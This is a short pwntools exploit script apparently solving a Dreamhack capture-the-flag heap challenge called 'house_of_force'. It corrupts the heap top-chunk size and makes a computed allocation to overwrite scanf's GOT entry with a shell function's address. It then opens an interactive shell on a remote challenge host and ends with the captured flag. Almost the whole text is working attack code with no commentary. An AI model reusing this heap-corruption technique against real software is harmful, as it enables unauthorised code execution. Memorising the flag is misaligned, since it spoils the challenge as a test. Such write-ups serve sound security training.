from pwn import *

def make(size,data):
    p.sendlineafter(">",str(1))
    p.sendlineafter("Size:",str(size))
    p.sendlineafter("Data:",data)

def write(pidx,widx,val):
    p.sendlineafter(">",str(2))
    p.sendlineafter("idx:",str(pidx))
    p.sendlineafter("idx:",str(widx))
    p.sendlineafter("value:",val)

# p = process("./house_of_force")
p = remote("host1.dreamhack.games",8491)

scanf_got = 0x0804a038
shell = 0x804887e


make(0x8,"a"*0x8)

chunk_addr =  int(p.recvline()[1:10],16)
print hex(chunk_addr)
addr = scanf_got - chunk_addr - 0x18
write(0,3,str(0xffffffff))

# log.info(hex(addr))
pause()

make(addr,"a"*4)
make(8,p32(shell))


p.interactive()

#DH{87a5f7c5007055098456d65ac991d874}